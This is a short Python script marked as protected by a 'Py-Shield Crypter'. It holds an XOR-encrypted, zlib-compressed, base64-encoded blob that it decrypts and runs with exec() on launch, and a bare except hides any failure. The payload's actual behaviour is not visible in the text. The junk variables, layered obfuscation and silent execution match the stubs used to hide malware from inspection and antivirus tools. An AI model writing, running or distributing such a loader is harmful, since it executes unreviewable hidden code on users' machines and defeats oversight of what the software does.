# Protected by Py-Shield Crypter
import base64, zlib, sys

IVeiRmhP = 389
ajZWGvbN = 367
jrhJTFrw = 363
ZNYaiYUX = 676
syWhWIal = 371

def _stage2():
    try:
        _k = base64.b64decode("U9GgPlfIWnh1ikBQSHeNHA==")
        _d = base64.b64decode("K00lajqngU5ldC6Qt5YtHsDdeKrMpgV6bQ/b9CP36Be51VkOQ8p35hG8Uvna49Azm65/b+Okf3NFi3YPp85qkpxMDCU61L4Wqird0pWkEroMugp0+VGbZ1jQB1elzbwmFJrHcIHwRG0zXWDoC8iJBSMrVUZj1uf7rOZGRxJiP3BepvIV6PtEpdkk86vnCE0e8VzT8y5StMwMtjPqPGy5UOcoA27BoQne6i4KB/E22Zjw4dfS9VrypH/Xm+CSvQKkCzc+6Hgzn5fr4HROlSnzArGKT17gq4ggI2AtivycGfrgl7RXprakk+lbbKLEaltRdXWBdTrR8NVB0PFCFWVSQY4NZq2XNSwBgq8cOfCsPfMJewQJyoo+RcKml1Z1tuUOWywv794Anktk0gD1g9M7+betnDyt0jQVCq4tlg06heHy4ltNZyyC0LbR8s0c1SeEjrH1Q2+rjY6rKBn6LceGeqviZ/hK5WWLv+ivU2OrX3dNjGg8w76lDWgyWQ4T6P2UEbnfKSY8njWMloUAIHS5GfptHiYaf4VeUmk34DK/M0AMj+EMyEiJyOSIwfSYJJ1sw89YpqMmPoIDImtvFopJoCYpMML+3Qj6OCH43XLyvvCdKRqc1IgncpRQPJBjqxkyam+oxwFdvFpe7sVZ3b+ZGBq/WDZwu5AvilLEMtU6T0HsuhDoDMRBX36gdhqpvEd/DBK4gjpYUUwDe1Srj+ugV3lUWCK106f32aDero6RfO9ToIfjsf16VQAJavG9czU5/Gdx9AU4h86dQH2O5ZRjSOR/K0hHUKWCGDxzwnyl7oxA/zL33FBgHcgfyfFMlicHL1qAmRSnNTEm6hO5NaF/gFmVxiDut1lq5mkKIGs/48oiG+q5zTBmMpeDHVHsgEaXUFAcKMM9eF5RJUsYbTPCIb+ipNdYzfPaH6x0s6oXybflo8RJvUPWbOOaWBmEnOJtNIucFPAu2fJM3BYIvrNSL+vtqDL/BVr9dF470PJw3SdYBpwPqoDUJx97kALvp3q7BAnHMlnNW88xXbNtHgINAPetMOAAuJ0uBliwS3+NIw5pBzD4UM4l6b1qQYfeA56qWnrrU0AA+w96WoZzqu/oloRJxY731skdSxcZRlVPCvjdll88ez9V9w==")
        _x = bytearray(b ^ _k[i % len(_k)] for i, b in enumerate(_d))
        _c = zlib.decompress(_x)
        exec(_c, globals())
    except Exception as e:
        pass

if __name__ == "__main__":
    _stage2()
